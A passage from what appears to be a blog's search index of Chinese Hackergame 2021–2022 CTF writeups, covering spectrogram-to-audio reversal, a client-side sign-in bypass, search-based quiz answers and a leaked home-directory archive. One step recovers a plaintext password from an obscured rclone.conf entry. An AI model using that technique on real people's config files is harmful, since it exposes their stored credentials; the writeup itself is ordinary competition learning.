generate_sound_visualization.py \u4e2d\u751f\u6210\u4e00\u4e2a gif\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u6765\u6d4b\u8bd5</p> <p>\u518d\u4ed4\u7ec6\u770b\u4e00\u770b generate_sound_visualization.py \u8fd9\u4e2a\u6587\u4ef6 \u4e3b\u8981\u4f7f\u7528\u4e86 <code>librosa</code>\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u7ffb\u6587\u6863\u6765\u770b\u61c2\u8fd9\u4e2a\u7a0b\u5e8f\uff1a <pre><code>y, sample_rate = librosa.load(\"flag.mp3\") # \u4ecemp3\u4e2d\u8bfb\u53d6\u6570\u636e\u548c\u91c7\u6837\u7387\n\nspectrogram = numpy.around( # \u56db\u820d\u4e94\u5165\uff0c\u4f46\u4f1a\u9020\u6210\u9006\u5411\u7684\u65f6\u5019\u6709\u5c11\u8bb8\u8bef\u5dee\u5bfc\u81f4\u6742\u97f3\n    librosa.power_to_db( # \u628a\u4ee5\u529f\u7387\u4e3a\u5355\u4f4d\u7684\u9891\u8c31\u56fe\u8f6c\u6362\u4e3a\u4ee5\u5206\u8d1d\u4e3a\u5355\u4f4d\n        librosa.feature.melspectrogram( # \u901a\u8fc7\u97f3\u9891\u6570\u636e\u548c\u91c7\u6837\u7387\u8ba1\u7b97\u6885\u5c14\u9891\u8c31\n            y, sample_rate, n_mels=num_freqs,\n            n_fft=fft_window_size, \n            hop_length=frame_step_size, \n            window=window_function_type\n        )\n    ) / quantize # \u9664\u4ee52\n) * quantize # \u4e58\u4ee52\n</code></pre></p> <p>\u7136\u540e\u53c8\u901a\u8fc7\u4e00\u4e9b <code>numpy</code> \u7684\u9a9a\u64cd\u4f5c\u6765\u751f\u6210\u6bcf\u4e00\u5e27\u7684\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7 <code>array2gif</code> \u5305\u7684 write_gif \u51fd\u6570\u6765\u751f\u6210 gif </p> <p>\u6240\u4ee5\u4e3b\u8981\u601d\u8def\u5c31\u662f\u628a\u6574\u4e2a\u7a0b\u5e8f\u5b8c\u6574\u5730\u9006\u8fc7\u6765</p> <p>\u7531\u4e8e\u5fc5\u5e94\u6ca1\u6709\u67e5\u5230 <code>gif2array</code> \u7684\u5305\uff0c\u6240\u4ee5\u8bfb\u53d6 gif \u5c31\u7528\u4e86\u7ecf\u5178 <code>PIL.Image</code>\uff1a <pre><code>from PIL import Image\nfile = Image.open(\"flag.gif\")\n\ntry:\n    while True:\n        gif_data.append(np.array(file))\n        file.seek(file.tell() + 1)\nexcept:\n    print(\"[+] Read gif file\")\n</code></pre></p> <p>\u7136\u540e\u662f\u89e3\u51b3\u90a3\u4e00\u5927\u6bb5 numpy \u9a9a\u64cd\u4f5c\u7684\u9006\u9a9a\u64cd\u4f5c\uff08 \u4f46\u662f\u6570\u7406\u57fa\u7840\u8fd9\u4e48\u5dee\u7684\u6211\u5f53\u7136\u662f\u4e0d\u60f3\u4ed4\u7ec6\u7814\u7a76\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u7528\u7535\u6ce2\u90a3\u9898\u7684 radio.mp3 \u5e26\u5165\uff0c\u770b\u4e00\u770b\u8981\u5f97\u5230\u7684 spectrogram \u662f\u4ec0\u4e48\u6837\u5b50 \u8f93\u51fa\u5f97\u5230\u7684 spectrogram \u662f\uff1a <pre><code>[[-58. -48. -30. ... -58. -58. -58.]\n [-58. -44. -26. ... -58. -58. -58.]\n [-58. -40. -16. ... -58. -58. -58.]\n ...\n [-58. -42. -30. ... -58. -58. -58.]\n [-58. -44. -32. ... -58. -58. -58.]\n [-58. -46. -34. ... -58. -58. -58.]]\n</code></pre> \u800c\u8f6c\u7f6e\u8fc7\u6765\u662f\uff1a <pre><code>[[-58. -58. -58. ... -58. -58. -58.]\n [-48. -44. -40. ... -42. -44. -46.]\n [-30. -26. -16. ... -30. -32. -34.]\n ...\n [-58. -58. -58. ... -58. -58. -58.]\n [-58. -58. -58. ... -58. -58. -58.]\n [-58. -58. -58. ... -58. -58. -58.]]\n</code></pre> \u51cf\u53bb min_db=-60 \u7b2c\u4e00\u884c\u6b63\u597d\u662f 2\uff0c\u7b2c\u4e8c\u884c\u662f [12. 16. 20. ... 18. 16. 14.] \u518d\u5bf9\u5e94\u5230\u751f\u6210\u7684 gif \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa gif \u7684\u7b2c\u4e00\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u90fd\u662f 2 \u800c\u7b2c\u4e8c\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u4e5f\u6070\u597d\u662f\u521a\u5f97\u51fa\u7684\u90a3\u7ec4\u6570 \u6240\u4ee5\u8981\u5f97\u5230\u7684 spectrogram \u5c31\u662f gif \u6bcf\u4e00\u5e27\u6240\u6709\u77e9\u5f62\u7684\u9ad8\u5ea6\u6784\u6210\u7684\u77e9\u9635\u7684\u8f6c\u7f6e</p> <p>\u518d\u7ed3\u5408\u6e90\u7801\uff1a <pre><code>numpy.array([\n    [\n        red_pixel if freq % 2 and round(frame[freq // 2]) &gt; threshold else white_pixel \n        for threshold in list(range(min_db, max_db + 1, quantize))[::-1]\n    ] \n    for freq in range(num_freqs * 2 + 1)\n])\n</code></pre> \u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e2a\u77e9\u5f62\u52a0\u4e0a\u5de6\u8fb9\u7684\u7a7a\u683c\u6b63\u597d\u662f 4 \u4e2a\u50cf\u7d20\uff0c\u6240\u4ee5\u6bcf\u56db\u5217\u8bfb\u53d6\u6700\u540e\u4e00\u5217\u5373\u53ef\uff1a <pre><code>spectrogramT = []\nfor data in gif_data:\n    res = []\n    for ind, line in enumerate(data.transpose()): # \u5c06\u6bcf\u4e00\u5e27\u8f6c\u7f6e\uff0c\u65b9\u4fbf\u8ba1\u7b97\n        num = sum(line) # \u8ba1\u7b97\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\uff08\u8f6c\u7f6e\u540e\u662f\u5bbd\u5ea6\uff09\n        if ind % 4 == 3:\n            res.append(num + min_db) # \u5f97\u5230\u7684\u6570\u8981\u52a0\u4e0a-60\u624d\u7b26\u5408\u89c4\u77e9\n    spectrogramT.append(res)\n\nspectrogram = np.array(spectrogramT).transpose() # \u5f97\u5230\u7684\u7ed3\u679c\u8f6c\u7f6e\u4e00\u4e0b\n</code></pre></p> <p>\u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u6885\u5c14\u9891\u8c31\u56fe\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5bf9 librosa \u7684\u90e8\u5206\u8fdb\u884c\u9006\u8fc7\u7a0b\u4e86 \u7ffb librosa \u7684\u6587\u6863\uff0c\u6709 <code>power_to_db</code> \u5f53\u7136\u4e5f\u5c31\u6709 <code>db_to_power</code> \u800c\u4e14\u7c7b\u4f3c\u4e8e melspectrogram \u51fd\u6570\u5728 librosa.feature \u4e2d\uff0c\u53ef\u4ee5\u4e13\u95e8\u770b feature \u90e8\u5206\u7684\u6587\u6863 \u7ffb\u5230\u4e86 inverse \u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u51fd\u6570 <code>librosa.feature.inverse.mel_to_audio</code> \u53ef\u4ee5\u76f4\u63a5\u628a\u6885\u5c14\u9891\u8c31\u56fe\u4e13\u4e3a\u97f3\u9891\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u7528\u5b83\u4e86\uff1a <pre><code>y = librosa.feature.inverse.mel_to_audio(\n    librosa.db_to_power(spectrogram), # \u4e58\u4e8c\u9664\u4e8c\u6ca1\u4ec0\u4e48\u5927\u7528\uff0c\u800c\u4e14\u5f71\u54cd\u6548\u679c\uff0c\u5c31\u5220\u4e86\n    sample_rate, n_iter=num_freqs, # \u91c7\u6837\u7387\u9898\u76ee\u63d0\u4f9b\u4e86\uff0c\u662f 22050Hz\n    n_fft=fft_window_size,\n    hop_length=frame_step_size,\n    window=window_function_type,\n)\n</code></pre></p> <p>\u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u8fd8\u539f\uff0c\u6700\u540e\u662f\u8f93\u51fa\uff0c\u4f46\u662f\u5e76\u6ca1\u5728 librosa \u4e2d\u627e\u5230\u97f3\u9891\u8f93\u51fa\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u7528\u4e86\u7ecf\u5178 <code>soundfile</code>\uff1a <pre><code>import soundfile as sf\nsf.write(\"flag.wav\", y, sample_rate)\n</code></pre></p> <p>\u7136\u540e\u6253\u5f00\u542c\u5c31\u884c\u4e86\uff0c\u9898\u76ee\u8bf4\u4e86\u662f\u4e2a 12 \u4f4d\u6570\uff0c\u6240\u4ee5\u5269\u4e0b\u7684\u5c31\u662f\u82f1\u8bed\u542c\u529b\u4e86\uff0c\u7ffb\u8bd1\u8fc7\u6765\u7684\u6570\u5b57\u5c31\u662f flag \u4e86 </p>"},{"location":"writeups/hackergame2021/#reference","title":"Reference","text":"<ul> <li>Hackergame</li> <li>\u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 - \u77e5\u4e4e</li> <li>LUG@USTC \u5b98\u7f51</li> <li>Wayback Machine archive.org</li> <li>SIGBOVIK 2021</li> <li>\u767e\u5ea6\u5168\u666f\u5730\u56fe</li> <li>\u4f2a\u9020http\u8bf7\u6c42ip\u5730\u5740 - \u535a\u5ba2\u56ed</li> <li>GraphQL\u5b98\u7f51\u3001GraphiQL\u3001GraphQL Voyager</li> <li>\u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e</li> <li>librosa\u6587\u6863</li> <li>PySoundFile\u6587\u6863</li> <li>Wilson's theorem - wikipedia</li> <li>BUU-RSA [RoarCTF2019]babyRSA - CSDN</li> <li>Euler's totient function - wikipedia</li> <li>LUKS2 doc pdf</li> <li>10 Linux cryptsetup Examples for LUKS Key Management</li> <li>pyinstxtractor</li> <li>uncompyle6</li> </ul>"},{"location":"writeups/hackergame2022/","title":"Hackergame 2022 Writeup","text":"<p> \u7ea6 8637 \u4e2a\u5b57  182 \u884c\u4ee3\u7801  34 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 31 \u5206\u949f</p> <p>Abstract</p> <p>\u7b2c\u4e8c\u6b21\u6765\u6253 Hackergame\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1ahttps://blog.tonycrane.cc/p/630bfdd5.html</p> <p>\u5b98\u65b9 writeup</p>"},{"location":"writeups/hackergame2022/#_1","title":"\u7b7e\u5230","text":"<p>\u4f17\u6240\u5468\u77e5\uff0c\u7b7e\u5230\u9898\u662f\u4e00\u9053\u624b\u901f\u9898\u3002</p> <p>\u4e3a\u4e86\u5145\u5206\u53d1\u6325\u51fa\u8bf8\u4f4d\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u800c\u624b\u901f\u4f18\u5f02\u4e8e\u5e38\u4eba\u7684\u9009\u624b\u4eec\u7684\u7279\u957f\uff0c\u6211\u4eec\u7cbe\u5fc3\u8bbe\u8ba1\u4e86\u4eca\u5e74\u7684\u7b7e\u5230\u9898\u3002\u8fdb\u4e00\u6b65\u5730\uff0c\u4e3a\u4e86\u66f4\u7ec6\u81f4\u5730\u533a\u5206\u4e0d\u540c\u624b\u901f\u7684\u9009\u624b\uff0c\u6211\u4eec\u8fd8\u901a\u8fc7\u8be6\u5c3d\u7684\u8c03\u7814\u53ca\u7edf\u8ba1\u5206\u6790\uff0c\u5c06\u7b7e\u4e0b\u5b57\u7b26\u7684\u65f6\u95f4\u9650\u5236\u5206\u4e3a\u4e86\u591a\u4e2a\u7b49\u7ea7\u3002\u53ea\u6709\u6700\u9876\u5c16\u7684\u624b\u901f\u9009\u624b\uff0c\u624d\u80fd\u5728 CPU \u6765\u5f97\u53ca\u53cd\u5e94\u4e4b\u524d\u987a\u5229\u7b7e\u4e0b 2022\uff0c\u4ece\u800c\u5f97\u5230\u5149\u8363\u7684 flag\uff01</p> <p>\u4e00\u4e2a\u7f51\u7ad9\uff0c\u624b\u5199\u6570\u5b57\u6210\u529f\u8bc6\u522b\u4e3a 2022 \u5c31\u53ef\u4ee5\u5b8c\u6210\u7b7e\u5230\u3002\u4e0d\u8fc7\u9650\u5236\u4e86\u6bcf\u4e2a\u6570\u5b57\u7684\u65f6\u95f4\uff0c\u4f9d\u6b21\u4e3a 2s\u30011s\u30010.1s\u30010s\u3002</p> <p>\u6211\u8fd8\u5929\u771f\u5730\u8bd5\u7740\u7b7e\u4e86\u597d\u51e0\u6b21\uff08\u5176\u5b9e\u662f\u6ca1\u6ce8\u610f\u5230\u90a3\u4e2a 0\uff09\uff0c\u75db\u5931\u4e00\u8840\u3002</p> <p>\u505a\u6cd5\u5176\u5b9e\u662f\u5728\u6e90\u7801\u91cc\u53d1\u73b0\u8bc6\u522b\u90fd\u5728\u524d\u7aef\u8fdb\u884c\uff0c\u6700\u7ec8\u63d0\u4ea4\u7684\u65f6\u5019\u662f\u8df3\u8f6c\u5230 <code>/?result=....</code> \u9875\u9762\uff08\u6216\u8005\u4ea4\u4e00\u6b21\u8bd5\u4e00\u4e0b\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u3002\u6240\u4ee5\u76f4\u63a5\u8bbf\u95ee <code>/?result=2022</code> \u5373\u53ef\u62ff\u5230 flag\uff1aflag{HappyHacking2022-\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#_2","title":"\u732b\u54aa\u95ee\u7b54\u55b5","text":"<p>\u53c2\u52a0\u732b\u54aa\u95ee\u7b54\u55b5\uff0c\u53c2\u52a0\u55b5\u54aa\u95ee\u7b54\u8c22\u8c22\u55b5\u3002</p> <p>\u7ecf\u5178\u9898\u76ee\uff0c\u641c\u7d22\u5927\u6742\u70e9\u3002\u9664\u4e86\u7b2c\u4e94\u9898\u4ee5\u5916\u8fd8\u662f\u5f88\u5bb9\u6613\u627e\u5230\u7684\u3002\uff08\u8fd9\u6b21\u7adf\u7136\u5206\u4e86\u4e24\u4e2a flag \u51fa\u6765 2333\uff09</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 NEBULA \u6218\u961f\uff08USTC NEBULA\uff09\u662f\u4e8e\u4f55\u65f6\u6210\u7acb\u7684\u55b5\uff1f</li> </ol> <p>\u76f4\u63a5\u641c\u7d22\u4e86\u4e00\u4e0b \u201c\u4e2d\u56fd\u79d1\u6280\u5927\u5b66 NEBULA \u6218\u961f\u201d\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u65b0\u95fb\uff1a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\uff08Nebula\uff09\u6218\u961f\u5728\u7b2c\u516d\u5c4a\u5f3a\u7f51\u676f\u518d\u521b\u4f73\u7ee9\uff0c\u5176\u4e2d\u6587\u672b\u6709\u7b80\u5355\u4ecb\u7ecd \u201c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u661f\u4e91\u6218\u961f\uff08Nebula\uff09\u6210\u7acb\u4e8e 2017 \u5e74 3 \u6708\u2026\u2026\u201d</p> <p>\u6240\u4ee5\u7b54\u6848\u5c31\u662f 2017-03\u3002</p> <ol> <li>2022 \u5e74 9 \u6708\uff0c\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5b66\u751f Linux \u7528\u6237\u534f\u4f1a\uff08LUG @ USTC\uff09\u5728\u79d1\u5927\u6821\u5185\u627f\u529e\u4e86\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u3002\u9664\u4e86\u4e13\u6ce8\u4e8e\u81ea\u7531\u64b8\u732b\u7684\u4e3b\u4f1a\u573a\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u548c\u6280\u672f\u76f8\u5173\u7684\u5206\u4f1a\u573a\uff08\u5982\u95ea\u7535\u6f14\u8bb2 Lightning Talk\uff09\u3002\u5176\u4e2d\u5728\u7b2c\u4e00\u4e2a\u95ea\u7535\u6f14\u8bb2\u4e3b\u9898\u91cc\uff0c\u4e3b\u8bb2\u4eba\u4e8e slides \u4e2d\u5c55\u793a\u4e86\u4e00\u5f20\u5728 GNOME Wayland \u4e0b\u4f7f\u7528 Wayland \u540e\u7aef\u4f1a\u51fa\u73b0\u663e\u793a\u95ee\u9898\u7684 KDE \u7a0b\u5e8f\u622a\u56fe\uff0c\u8bf7\u95ee\u8fd9\u4e2a KDE \u7a0b\u5e8f\u7684\u540d\u5b57\u662f\u4ec0\u4e48\uff1f</li> </ol> <p>\u5728 LUG @ USTC \u7684 wiki \u5c31\u80fd\u627e\u5230\u8f6f\u4ef6\u81ea\u7531\u65e5\u6d3b\u52a8\u7684\u9875\u9762\uff1aSoftware Freedom Day\uff0c\u5176\u4e2d\u53ef\u4ee5\u627e\u5230\u6240\u8bf4\u7684\u90a3\u7bc7 slides\uff1a\u300aGNOME Wayland \u4f7f\u7528\u4f53\u9a8c\uff1a\u4e00\u4e2a\u666e\u901a\u7528\u6237\u7684\u89c6\u89d2\u300b\uff0c\u5176\u4e2d\u7b2c\u5341\u4e94\u9875\u8bb2\u4e86\u6240\u8c13\u7684 KDE \u7a0b\u5e8f\u5728 Wayland \u4e0b\u7684\u663e\u793a\u95ee\u9898\u3002\u4f46\u622a\u56fe\u91cc\u5e76\u6ca1\u6709\u8f6f\u4ef6\u540d\uff0c\u628a\u4e0b\u9762\u4e00\u884c\u5de5\u5177\u680f\u7684\u6587\u672c\u5168\u603c\u5230\u5fc5\u5e94\u91cc\uff0c\u641c\u5230\u4e86 Kdenlive \u7684\u5b98\u65b9\u6587\u6863\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f Kdenlive\u3002</p> <ol> <li>22 \u5e74\u575a\u6301\uff0c\u5c0f C \u4ecd\u7136\u4f7f\u7528\u7740\u4e00\u53f0\u4ed6\u4ece\u5c0f\u7528\u5230\u5927\u7684 Windows 2000 \u8ba1\u7b97\u673a\u3002\u90a3\u4e48\uff0c\u5728\u4e0d\u53d8\u66f4\u7cfb\u7edf\u914d\u7f6e\u548c\u7a0b\u5e8f\u4ee3\u7801\u7684\u524d\u63d0\u4e0b\uff0cFirefox \u6d4f\u89c8\u5668\u80fd\u5728 Windows 2000 \u4e0b\u8fd0\u884c\u7684\u6700\u540e\u4e00\u4e2a\u5927\u7248\u672c\u53f7\u662f\u591a\u5c11\uff1f</li> </ol> <p>\u641c\u7d22 \u201cFirefox Windows 2000\u201d \u53ef\u4ee5\u770b\u5230 Firefox 13 \u4e0d\u518d\u652f\u6301 Windows 2000 \u7684\u5f88\u591a\u65b0\u95fb\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f 12\u3002</p> <ol> <li>\u4f60\u77e5\u9053 PwnKit\uff08CVE-2021-4034\uff09\u55b5\uff1f\u636e\u53ef\u9760\u8c23\u4f20\uff0c\u51fa\u9898\u7ec4\u7684\u67d0\u4f4d\u540c\u5b66\u672c\u6765\u60f3\u51fa\u8fd9\u6837\u4e00\u9053\u7c7b\u4f3c\u7684\u9898\uff0c\u4f46\u662f\u53d1\u73b0 Linux \u5185\u6838\u66f4\u65b0\u4e4b\u540e\u5c45\u7136\u4e0d\u518d\u5141\u8bb8 argc \u4e3a 0 \u4e86\u55b5\uff01\u90a3\u4e48\uff0c\u8bf7\u627e\u51fa\u5728 Linux \u5185\u6838 master \u5206\u652f\uff08torvalds/linux.git\uff09\u4e0b\uff0c\u9996\u4e2a\u53d8\u52a8\u6b64\u884c\u4e3a\u7684 commit \u7684 hash \u5427\u55b5\uff01</li> </ol> <p>\u5728 Linux \u5185\u6838 GitHub dev \u9875\u9762\u5168\u5c40\u641c\u7d22\u4e86\u4e00\u4e0b argc == 0\uff0c\u53d1\u73b0\u4e86\u4e00\u4e9b\u68c0\u67e5\u3002\u627e\u5230\u4e2a\u6bd4\u8f83\u50cf\u7684\u8fdb\u5230\u9875\u9762\u91cc blame\uff0c\u627e\u5230\u4e86 commit\uff1aexec: Force single empty string when argv is empty\uff08\u5176\u5b9e commit message \u91cc\u5c31\u5199\u4e86 CVE-2021-4034\uff09\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f dcd46d897adb70d63e025f175a00a89797d31a43\u3002</p> <ol> <li>\u901a\u8fc7\u76d1\u89c6\u732b\u54aa\u5728\u952e\u76d8\u4e0a\u770b\u4f3c\u4e71\u8e29\u7684\u6545\u610f\u884c\u4e3a\uff0c\u4e0d\u51fa\u6240\u6599\u53d1\u73b0\u5176\u79d8\u5bc6\u8fde\u4e0a\u4e86\u4e00\u4e2a ssh \u670d\u52a1\u5668\uff0c\u7ec8\u7aef\u663e\u793a <code>ED25519 key fingerprint is MD5:e4:ff:65:d7:be:5d:c8:44:1d:89:6b:50:f5:50:a0:ce.</code>\uff0c\u4f60\u77e5\u9053\u732b\u54aa\u5728\u8fde\u63a5\u4ec0\u4e48\u57df\u540d\u5417\uff1f</li> </ol> <p>\u6bd4\u8f83\u96be\u641e\u7684\u4e00\u9053\u9898\uff0c\u60f3\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u751a\u81f3\u4ee5\u4e3a\u662f\u4e00\u4e9b crypto \u9898\u3002\u4e0d\u8fc7\u6bd5\u7adf\u662f\u4e00\u9053\u641c\u7d22\u9898\uff0c\u4e8e\u662f\u76f4\u63a5\u628a md5 fingerprint \u603c\u5230\u8c37\u6b4c\u91cc\uff0c\u641c\u5230\u4e86\u4e00\u4e2a\u6587\u6863\u5176\u4e2d\u6709\u8fd9\u4e2a\uff08\u53ef\u80fd\u662f\u505a\u4e2a\u4f8b\u5b50\uff09\uff1aZeek Logs &gt; ssh.log\u3002\u770b\u5230\u91cc\u9762\u5bf9\u5e94\u7684 ip\uff1a205.166.94.16\uff0c\u8bbf\u95ee\u8fdb\u53bb\u770b\u5230\u4e86 sdf.org \u57df\u540d\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f sdf.org\u3002\uff08\u5176\u5b9e\u662f\u56e4 flag \u9636\u6bb5\u624d\u505a\u51fa\u6765\u7684\uff09</p> <ol> <li>\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u53ef\u4ee5\u51fa\u6821\u8bbf\u95ee\u56fd\u5185\u56fd\u9645\u7f51\u7edc\u4ece\u800c\u5141\u8bb8\u4e91\u64b8\u732b\u7684\u201c\u7f51\u7edc\u901a\u201d\u5b9a\u4ef7\u4e3a 20 \u5143\u4e00\u4e2a\u6708\u662f\u4ece\u54ea\u4e00\u5929\u6b63\u5f0f\u5b9e\u884c\u7684\uff1f</li> </ol> <p>\u641c\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u4e86\u4e00\u7bc7\u901a\u77e5\uff1a\u5173\u4e8e\u5b9e\u884c\u65b0\u7684\u7f51\u7edc\u8d39\u7528\u5206\u62c5\u529e\u6cd5\u7684\u901a\u77e5\uff0c\u662f 2011 \u5e74 1 \u6708 1 \u65e5\u65bd\u884c\u7684\uff0c\u4f46\u662f\u8fd9\u7bc7\u901a\u77e5\u91cc\u56fd\u9645\u7f51\u7edc\u901a\u8d39\u7528\u5e76\u6ca1\u6709\u6539\u53d8\uff0c\u8fd8\u662f 20 \u5143\u3002\u770b\u6765\u662f\u6bd4\u8f83\u4e45\u8fdc\u7684\u4e8b\u60c5\u4e86\u3002\u641c\u7d22\u540c\u540d\u901a\u77e5\uff0c\u53ef\u4ee5\u53d1\u73b0\u53e6\u4e00\u7bc7\u3002\u91cc\u9762\u5199\u4e86\u56fd\u9645\u7f51\u7edc\u901a\u5b9a\u4ef7 20 \u5143\uff0c2003 \u5e74 3 \u6708 1 \u65e5\u5b9e\u884c\u3002</p> <p>\u6240\u4ee5\u7b54\u6848\u662f 2003-03-01\u3002</p> <p>\u4ea4\u4e0a\u53bb\u5f97\u5230\u4e24\u4e2a flag\uff08\u4e00\u4e2a\u662f\u5bf9\u4e09\u9053\u9898\u7684\uff0c\u4e00\u4e2a\u662f\u5bf9\u516d\u9053\u9898\u7684\uff09\uff1a flag{meowexammeow_\u2026\u2026} flag{meowexamfullymeowed!_\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#_3","title":"\u5bb6\u76ee\u5f55\u91cc\u7684\u79d8\u5bc6","text":"<p>\u5b9e\u9a8c\u5ba4\u7ed9\u5c0f K \u5206\u914d\u4e86\u4e00\u4e2a\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8d26\u6237\uff0c\u4e3a\u4e86\u4e0d\u7528\u91cd\u65b0\u914d\u7f6e VSCode, Rclone \u7b49\u5c0f K \u5e38\u7528\u7684\u751f\u4ea7\u529b\u5de5\u5177\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5f53\u7136\u662f\u628a\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u6253\u5305\u62f7\u8d1d\u8fc7\u53bb\u3002</p> <p>\u4f46\u662f\u5f88\u4e0d\u5de7\uff0c\u5bf9\u5b58\u653e\u4e8e\u5c0f K \u7535\u8111\u91cc\u7684 Hackergame 2022 \u7684 flag \u89ca\u89ce\u5df2\u4e45\u7684 Eve \u540c\u5b66\u6070\u597d\u6700\u8fd1\u62ff\u5230\u4e86\u8fd9\u4e2a\u670d\u52a1\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\uff08\u901a\u8fc7\u89ca\u89ce\u53e6\u4e00\u4f4d\u540c\u5b66\u7684\u654f\u611f\u4fe1\u606f\uff09\uff0c\u4e8e\u662f\u4e5f\u62ff\u5230\u4e86\u5c0f K \u540c\u5b66\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\u3002</p> <p>\u7136\u800c\u66f4\u4e0d\u5de7\u7684\u662f\uff0c\u7531\u4e8e Hackergame \u90e8\u7f72\u4e86\u57fa\u4e8e\u9b54\u6cd5\u7684\u4f5c\u5f0a\u884c\u4e3a\u9884\u77e5\u7cfb\u7edf\uff0cEve \u540c\u5b66\u8fd8\u672a\u6765\u5f97\u53ca\u89e3\u538b\u538b\u7f29\u5305\u5c31\u88ab Z \u540c\u5b66\u63d0\u524d\u6293\u83b7\u3002</p> <p>\u4e3a\u4e86\u8bc1\u660e Eve \u540c\u5b66\u4e0d\u826f\u4f01\u56fe\u7684\u5371\u5bb3\u6027\uff0c\u4f60\u80fd\u5728\u8fd9\u4e2a\u538b\u7f29\u5305\u91cc\u627e\u5230\u91cd\u8981\u7684 flag \u4fe1\u606f\u5417\uff1f</p> <p>\u7ed9\u4e86\u4e00\u4e2a\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u538b\u7f29\u5305\uff0c\u8fdb\u53bb\u5168\u5c40\u641c\u7d22\u4e00\u4e0b flag \u53ef\u4ee5\u53d1\u73b0 VSCode \u7684\u5386\u53f2\u6587\u4ef6\u91cc\u6709\u4e00\u4e2a DUGV.c \u91cc\u6709\u4e00\u4e2a\u6ce8\u91ca\u6389\u7684 flag\uff1aflag{finding_everything_through_vscode_config_file_\u2026\u2026}\uff08\u62a2\u4e86\u4e2a\u4e00\u8840 2333\uff09</p> <p>\u7b2c\u4e8c\u90e8\u5206\u8fd8\u662f\u6709\u4e9b\u590d\u6742\u7684\u3002\u641c flag \u7684\u65f6\u5019\u8fd8\u53ef\u4ee5\u53d1\u73b0 .config/rclone/rclone.conf \u91cc\u6709\u4e00\u4e2a\u540d\u4e3a flag2 \u7684\u914d\u7f6e\u9879\uff1a <pre><code>[flag2]\ntype = ftp\nhost = ftp.example.com\nuser = user\npass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ\n</code></pre></p> <p>\u6ca1\u7528\u8fc7 rclone\uff0c\u81ea\u5df1\u88c5\u4e86\u4e00\u4e2a\u8bd5\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0 pass \u662f\u6df7\u6dc6\u540e\u7684\uff0c\u800c\u4e14\u662f\u968f\u673a\u7684\uff0c\u6709\u4e00\u4e2a\u547d\u4ee4 rclone obscure \u53ef\u4ee5\u7528\u6765\u6df7\u6dc6\u5bc6\u7801\u3002\u6587\u6863\u91cc\u4e5f\u8bf4\u4e86\u6df7\u6dc6\u7684\u76ee\u7684\u4e5f\u53ea\u662f\u9632\u6b62\u6709\u4eba\u53ef\u4ee5\u4e00\u773c\u770b\u5230\u5bc6\u7801\u800c\u5df2\uff0c\u5e76\u6ca1\u6709\u52a0\u5bc6\uff0crclone \u662f\u53ef\u4ee5\u76f4\u63a5\u590d\u539f\u660e\u6587\u7684\u3002\u4e8e\u662f\u5c31\u7ffb\u4e86\u4e0b rclone \u6e90\u7801\uff0c\u53ef\u4ee5\u5728 obscure \u76f8\u5173\u6e90\u7801 \u91cc\u627e\u5230\u6062\u590d\u76f8\u5173\u7684\u51fd\u6570 Reveal\uff0c\u590d\u5236\u4e0b\u6765\u8dd1\u4e00\u4e0b\u7ed9\u51fa\u7684 pass \u5373\u53ef\u4ee5\u6062\u590d\u5bc6\u7801\uff0c\u5373\uff1aflag{get_rclone_password_from_config!_\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#heilang","title":"HeiLang","text":"<p>\u6765\u81ea Heicore \u793e\u533a\u7684\u65b0\u4e00\u4ee3\u7f16\u7a0b\u8bed\u8a00 